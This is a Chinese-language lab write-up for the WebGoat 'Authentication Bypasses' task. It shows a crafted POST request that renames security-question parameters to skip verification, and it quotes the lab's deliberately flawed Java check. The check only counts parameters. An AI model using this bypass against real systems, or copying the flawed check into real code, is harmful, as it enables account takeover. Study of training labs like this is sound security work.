# Authentication Bypasses

认证旁路，常见的手段有重命名参数、删除部分参数等。

## Task 1

根据提示，保留参数数量一致，但重命名参数即可。

构造如下请求：

```
POST /WebGoat/auth-bypass/verify-account HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/x-www-form-urlencoded
cache-control: no-cache
Postman-Token: 88e2ab34-c034-4fa1-898d-42808d77c352
secQuestion2=1secQuestion3=2jsEnabled=1verifyMethod=SEC_QUESTIONSuserId=12309746
```

即可，后来发现其 Java 代码只检查了参数数量，然后尝试取出参数，如果失败就跳过：

``` Java
public boolean verifyAccount(Integer userId, HashMap<String,String> submittedQuestions ) {
    //short circuit if no questions are submitted
    if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) {
        return false;
    }
    if (submittedQuestions.containsKey("secQuestion0") && !submittedQuestions.get("secQuestion0").equals(secQuestionStore.get(verifyUserId).get("secQuestion0"))) {
        return false;
    }
    if (submittedQuestions.containsKey("secQuestion1") && !submittedQuestions.get("seQuestion1").equals(secQuestionStore.get(verifyUserId).get("secQuestion1"))) {
        return false;
    }
    // else
    return true;
}
```
